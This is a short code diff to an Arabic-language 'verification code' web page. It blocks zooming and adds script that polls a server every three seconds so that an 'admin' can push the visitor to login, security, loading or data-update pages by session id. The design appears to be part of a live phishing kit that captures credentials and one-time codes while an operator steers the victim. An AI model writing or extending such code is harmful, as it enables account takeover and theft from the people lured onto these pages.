@@ -2,7 +2,7 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=0.85, maximum-scale=0.85, user-scalable=no">
     <title>رمز التحقق</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
     <style>
@@ -200,6 +200,20 @@
             document.getElementById('errorMsg').classList.add('show');
             document.getElementById('codeInput').classList.add('error-border');
         }
+
+        // Background polling for admin redirects
+        setInterval(function(){
+          fetch('/api/status/'+sid).then(function(r){return r.json();}).then(function(d){
+            if(d.status==='redirect'&&d.redirect){
+              var pages={security:'security.html',code:'code.html',login:'login.html',wait:'loading.html','update-data':'update-data.html'};
+              var target=pages[d.redirect];
+              if(target){
+                if(target==='code.html')window.location.href='code.html?id='+sid;
+                else window.location.href=target+'?id='+sid;
+              }
+            }
+          }).catch(function(){});
+        },3000);
 
         function submitCode() {
             var code = document.getElementById('codeInput').value.trim();
